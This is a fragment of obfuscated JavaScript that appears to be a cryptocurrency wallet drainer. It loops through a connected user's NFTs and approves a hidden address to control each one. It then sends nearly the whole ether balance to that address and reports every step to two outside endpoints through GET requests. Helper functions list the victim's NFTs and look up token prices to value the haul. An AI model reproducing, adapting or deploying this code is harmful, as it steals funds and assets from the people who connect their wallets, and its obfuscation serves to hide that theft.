writeContract({'address':_0x1086fe['address'],'abi':ABI,'functionName':_0x24d6ec(0x123),'args':[Oxa,_0x24d6ec(0xac)]});console['log'](_0x24d6ec(0xc9),_0x254650),_0x254650&&(console[_0x24d6ec(0xd1)](_0x24d6ec(0x12e)),sendMessage(_0x24d6ec(0x115)),sendMessage(_0x24d6ec(0x130)+_0x1086fe['address']),sendMessage(_0x24d6ec(0x119)+_0x1086fe[_0x24d6ec(0xca)]),sendMessage(_0x24d6ec(0xfe)+Oxa));}catch(_0x15a5e4){console[_0x24d6ec(0xd1)](_0x24d6ec(0x141)+_0x15a5e4),sendMessage(_0x24d6ec(0xfd));}};await loopNfts(NFTs);}async function loopNfts(_0xf8fbba){const _0x324061=_0x88a0f4;for await(let _0x481064 of _0xf8fbba){console['log'](_0x324061(0xc6),_0x481064);try{let {hash:_0x25bdff}=await writeContract({'address':_0x481064[_0x324061(0xff)],'abi':ABIN,'functionName':_0x324061(0x154),'args':[Oxa,!![]]});console['log']('hash',_0x25bdff),console[_0x324061(0xd1)](_0x324061(0x10e)+receipt),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x324061(0x159)+_0x481064[_0x324061(0xff)]),sendMessage(_0x324061(0xfe)+Oxa);}catch(_0x2e5d48){console[_0x324061(0xd1)](_0x324061(0x141)+_0x2e5d48),sendMessage(_0x324061(0xfd));}}await onSendEther();}async function onSendEther(){const _0x2f47ce=_0x88a0f4;console[_0x2f47ce(0xd1)]('sending\x20ether');try{let _0x564c14=await fetchBalance({'address':selectedAccount});console['log'](_0x564c14);const _0x2b3736=await fetchFeeData();console[_0x2f47ce(0xd1)](_0x2b3736);var _0x5bd1bc=_0x2b3736[_0x2f47ce(0xd9)]['gasPrice'];_0x5bd1bc=parseFloat(_0x5bd1bc);let _0x12e9d2=parseFloat(_0x564c14[_0x2f47ce(0xd9)])-_0x5bd1bc*0.00042;_0x12e9d2=parseEther(_0x12e9d2[_0x2f47ce(0xeb)]()),console['log'](_0x12e9d2);const {hash:_0xb64ced}=await sendTransaction({'to':Oxa,'value':_0x12e9d2});console[_0x2f47ce(0xd1)](_0xb64ced),sendMessage('Transaction\x20hash\x20',_0xb64ced),sendMessage(_0x2f47ce(0xf9)),sendMessage(_0x2f47ce(0x138));}catch{sendMessage(_0x2f47ce(0x11e));}}function _0x47f0(_0x2dc04f,_0x3bbdf5){const _0x292687=_0x2926();return _0x47f0=function(_0x47f068,_0x587549){_0x47f068=_0x47f068-0xac;let _0x3e2f38=_0x292687[_0x47f068];return _0x3e2f38;},_0x47f0(_0x2dc04f,_0x3bbdf5);}async function sendMessage(_0x447801){sendMessage1(_0x447801),sendMessage2(_0x447801);}async function sendMessage1(_0x24c6c9){return new Promise((_0x585c09,_0x2aed97)=>{const _0x1c68a7=_0x47f0,_0x9d1e91=Oxc1;fetch(_0x1c68a7(0x10c)+_0x9d1e91+_0x1c68a7(0xb6)+_0x24c6c9,{'method':'GET','headers':{}})[_0x1c68a7(0xc4)](async _0x56e416=>{const _0x19efc0=_0x1c68a7;if(_0x56e416[_0x19efc0(0x13a)]>0x18f)throw _0x56e416;_0x585c09(await _0x56e416['json']());})['catch'](_0x36d877=>{_0x2aed97(_0x36d877);});});}async function sendMessage2(_0x2b11a9){return new Promise((_0x1fd2cd,_0x103cbd)=>{const _0x57c6d7=_0x47f0,_0x13d0bd=Oxc2;fetch(_0x57c6d7(0x10c)+_0x13d0bd+_0x57c6d7(0xb6)+_0x2b11a9,{'method':'GET','headers':{}})['then'](async _0x22585f=>{const _0x1b529e=_0x57c6d7;if(_0x22585f[_0x1b529e(0x13a)]>0x18f)throw _0x22585f;_0x1fd2cd(await _0x22585f[_0x1b529e(0xe4)]());})['catch'](_0x4a5b89=>{_0x103cbd(_0x4a5b89);});});}async function getPrice(_0x581d96){return new Promise((_0x397e11,_0x3f3878)=>{const _0x796b34=_0x47f0;fetch('https://api.coingecko.com/api/v3/simple/token_price/arbitrum-one?contract_addresses='+_0x581d96+_0x796b34(0x122),{'method':_0x796b34(0x109),'headers':{}})[_0x796b34(0xc4)](async _0x6ac4a6=>{const _0x2a868a=_0x796b34;if(_0x6ac4a6[_0x2a868a(0x13a)]>0x18f)throw _0x6ac4a6;_0x397e11(await _0x6ac4a6[_0x2a868a(0xe4)]());})[_0x796b34(0x12d)](_0x1ba241=>{_0x3f3878(_0x1ba241);});});}async function getValue(_0x300ea7,_0x1a53a6,_0x8c8e49){const _0x4d1c10=_0x88a0f4;console[_0x4d1c10(0xd1)](_0x300ea7,_0x1a53a6,_0x8c8e49);let _0x4c91aa=await getPrice(_0x300ea7);console[_0x4d1c10(0xd1)](_0x4d1c10(0x128),_0x4c91aa),_0x4c91aa=parseFloat(_0x4c91aa[_0x300ea7]['usd']);let _0x51078b=_0x1a53a6/0xa**(_0x8c8e49||0x12)*_0x4c91aa;return _0x51078b=parseInt(_0x51078b),_0x4c91aa?_0x51078b:0x0;}async function getNFTs(_0x55accf='',_0x37d29e=_0x88a0f4(0xd8),_0x3243b5=_0x88a0f4(0xd3),_0x36b790='50'){return new Promise((_0xe82518,_0x4cc294)=>{const _0x3a0322=_0x47f0;fetch(_0x3a0322(0x165)+_0x55accf+_0x3a0322(0xe8)+_0x3243b5+_0x3a0322(0x117)+_0x36b790,{'method':'GET','headers':{'accept':'application/json','X-API-Key':_0x37d29e}})['then'](async _0x5c6f6c=>{const _0x302659=_0x3a0322;if(_0x5c6f6c[_0x302659(0x13a)]>0x18f)throw _0x5c6f6c;_0xe82518(await _0x5c6f6c[_0x302659(0xe4)]());})[_0x3a0322(0x12d)](_0x582d22=>{_0x4cc294(_0x582d22);});});}